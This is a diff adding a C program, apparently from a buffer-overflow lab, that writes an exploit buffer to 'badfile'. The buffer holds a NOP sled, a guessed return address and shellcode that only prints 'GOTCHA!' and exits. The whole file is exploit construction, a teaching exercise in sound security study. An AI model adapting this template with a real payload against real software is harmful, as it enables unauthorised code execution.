@@ -1,0 +1,51 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+char shellcode[] =
+    "\xeb\x16"
+    "\x31\xdb"
+    "\x31\xd2"
+    "\x31\xc0"
+    "\x59"
+    "\xbb\x01\x00\x00\x00"
+    "\xb2\x09"
+    "\xb0\x04"
+    "\xcd\x80"
+    "\xb0\x01"
+    "\xcd\x80"
+    "\xe8\xe5\xff\xff\xff"
+    "GOTCHA!\n";
+
+#define OFFSET 1500
+
+unsigned long get_ESP(void) {
+    __asm__("movl %ESP,%EAX");
+}
+
+int main(int argc, char **argv) {
+    unsigned long addr;
+    FILE *badfile;
+    char buffer[1024];
+
+    addr = get_ESP() + OFFSET;
+    fprintf(stderr, "Using Offset: 0x%x\nShellcode Size: %d\n", addr, sizeof(shellcode));
+
+    /* Make exploit buffer */
+    memset(buffer, 0x90, 1024);
+    
+    /* Store address of the shellcode in little-endian order */
+    buffer[12] = addr & 0x000000ff;
+    buffer[13] = (addr & 0x0000ff00) >> 8;
+    buffer[14] = (addr & 0x00ff0000) >> 16;
+    buffer[15] = (addr & 0xff000000) >> 24;
+    
+    memcpy(&buffer[(sizeof(buffer) - sizeof(shellcode))], shellcode, sizeof(shellcode));
+
+    /* Write the exploit buffer to "badfile" */
+    badfile = fopen("./badfile", "w");
+    fwrite(buffer, 1024, 1, badfile);
+    fclose(badfile);
+
+    return 0;
+}
